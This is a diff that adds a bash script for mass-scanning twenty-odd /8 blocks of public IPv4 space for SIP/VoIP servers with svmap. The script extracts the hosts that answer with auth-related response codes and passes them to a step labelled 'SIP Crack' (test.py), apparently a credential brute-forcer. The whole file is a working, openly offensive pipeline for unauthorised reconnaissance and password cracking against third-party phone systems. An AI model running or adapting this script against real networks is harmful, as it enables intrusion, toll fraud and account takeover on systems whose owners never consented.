@@ -1,0 +1,178 @@
+#!/bin/bash
+
+# Scan IPv4 range on port sip
+
+echo -e "\nStart scanning ...\n"
+
+VAR0=190.0.0.0/8
+VAR1=191.0.0.0/8
+VAR2=192.0.0.0/8
+VAR3=193.0.0.0/8
+VAR4=194.0.0.0/8
+VAR5=195.0.0.0/8
+VAR6=200.0.0.0/8
+VAR7=201.0.0.0/8
+VAR8=202.0.0.0/8
+VAR9=203.0.0.0/8
+VAR10=204.0.0.0/8
+VAR11=205.0.0.0/8
+VAR12=206.0.0.0/8
+VAR13=207.0.0.0/8
+VAR14=208.0.0.0/8
+VAR15=209.0.0.0/8
+VAR16=210.0.0.0/8
+VAR17=211.0.0.0/8
+VAR18=212.0.0.0/8
+VAR19=213.0.0.0/8
+VAR20=214.0.0.0/8
+VAR21=215.0.0.0/8
+VAR22=216.0.0.0/8
+VAR23=217.23.0.0/8
+
+         echo ----------------- $VAR0----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR0 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR1----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR1 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR2----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR2 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR3----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR3 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR4----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR4 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR5----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR5 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR6----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR6 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR7----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR7 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR8----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR8 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR9----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR9 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR10----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR10 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR11----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR11 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR12----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR12 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR13----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR13 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR14----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR14 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR15----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR15 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR16----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR16 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR17----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR17 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR18----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR18 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR19----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR19 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR20----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR20 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR21----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR21 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR22----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR22 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+         echo ----------------- $VAR23----------------
+python sip/svmap.py -p5060-5099,6060-6065,14310,9090,1025,1153,10243 -t0.0 $VAR23 -m INVITE -m REGISTER -m OPTIONS -v >> =ALLresult.txt
+
+
+
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+sleep 5
+
+echo -e "\nEnding scanning port !\n"
+
+# SIP Responses
+
+echo -e "\nStart SIP Responses ...\n"
+
+
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" =ALLresult.txt > IPS
+perl run IPS
+cat 401.pal 400.pal 403.pal 404.pal 500.pal >> ipSIP.txt
+rm IPS # remove the file IPS
+mv =ALLresult.txt =ALL.txt # change file name
+sleep 1
+
+echo -e "\nEnding Responses !\n"
+
+# ip extractor
+echo -e "\nStart ip extractor ...\n"
+
+grep -Po "([0-2]?\d?\d\.){3}[0-2]?\d?\d" ipSIP.txt > ipGOOD.txt
+sort -u ipGOOD.txt > ipsssss.txt
+rm ipSIP.txt # remove the file IPS
+rm ipGOOD.txt
+
+echo -e "\nEnding ip extractor !\n"
+
+# Check the validity of the IPs
+
+echo -e "\nStart Check the validity of the IPs ...\n"
+
+cat ipsssss.txt | perl -lane 'use warnings; use strict; for my $i (@F){if ($i =~/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[1-9])\.)(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){2}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/) { print $i; } }' > rU
+rm ipsssss.txt # remove the file IPS
+rm *.pal # remove the file
+
+echo -e "\nEnding Check the validity of the IPs !\n"
+
+# scan SIP Crack
+
+echo -e "\nStart SIP Crack ...\n"
+
+python test.py rU 5000
+
+echo -e "\nEnding SIP Crack !\n"
+
+sleep 5
+
+echo -e "\nEnding crack !\n"
+echo -e "\nby Mohammad Elnwajha\n"
